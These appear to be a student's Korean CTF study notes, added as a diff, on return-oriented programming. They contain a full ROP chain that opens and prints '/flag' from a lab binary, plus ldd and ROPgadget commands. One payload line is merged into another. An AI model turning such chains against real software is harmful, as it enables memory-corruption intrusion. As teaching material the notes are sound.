@@ -37,3 +37,57 @@ OPEN THE FLAG and print value> [!PDF|] [[L13 Return-oriented Programming.pdf#pag
 > OFfset
 
 
+```
+# sendfile64 0x7ffff7ed6100 # open64 0x7ffff7ed0e50  
+# .date 0x0000000000404030 p = ''
+
+p += "A"*56  
+p += pack('<Q', 0x00007ffff7de6b72) # pop rdi ; ret  
+p += pack('<Q', 0x0000000000404030) # @ .data  
+p += pack('<Q', 0x00007ffff7e0a550) # pop rax ; ret  
+p += '/flag'  
+p += pack('<Q', 0x00007ffff7e6b85b) # mov qword ptr [rdi], rax ; ret p += pack('<Q', 0x00007ffff7de7529) # pop rsi ; ret  
+p += pack('<Q', 0x0000000000000000) # 0  
+p += pack('<Q', 0x00007ffff7ed0e50) # open64  
+p += pack('<Q', 0x00007ffff7f221e2) # mov rsi, rax ; shr ecx, 3 ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret  
+p += pack('<Q', 0x00007ffff7de6b72) # pop rdi ; ret  
+p += pack('<Q', 0x0000000000000001) # 1  
+p += pack('<Q', 0x00007ffff7edc371) # pop rdx ; pop r12 ; ret  
+p += pack('<Q', 0x0000000000000000) # 0  
+p += pack('<Q', 0x0000000000000001) # 1  
+p += pack('<Q', 0x00007ffff7e5f822) # pop rcx; ret  
+p += pack('<Q', 0x0000000000000050) # 80  
+p += pack('<Q', 0x00007ffff7ed6100) # sendfile64  
+p += pack('<Q', 0x00007ffff7e0a550) # pop rax ; ret  
+p += pack('<Q', 0x000000000000003c) # 60  
+p += pack('<Q', 0x00007ffff7de584d) # syscall  
+print p
+
+|   |
+|---|
+|1|
+|0|
+|Addr of “pop rdx; pop r12; ret”|
+|1|
+|Addr of “pop rdi; ret”|
+|Addr of “mov rsi, rax ; shr ecx, 3 ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret”|
+|... many bytes ...|
+||
+||
+```
+
+1. ldd로 확인
+```
+ctf@bufferoverflow_overflowret4_no_excstack_64:/$ ldd ./bufferoverflow_overflowret4_no_excstack_64 
+        linux-vdso.so.1 (0x00007ffff7fcd000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dc9000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcf000)
+```
+2. ROPGADGET으로 가젯 찾기
+```
+python3 ROPgadget/ROPgadget.py --binary ./bufferoverflow_overflowret4_no_excstack_64
+
+python3 ROPgadget/ROPgadget.py --binary /lib/x86_64-linux-gnu/libc.so.6
+
+
+```
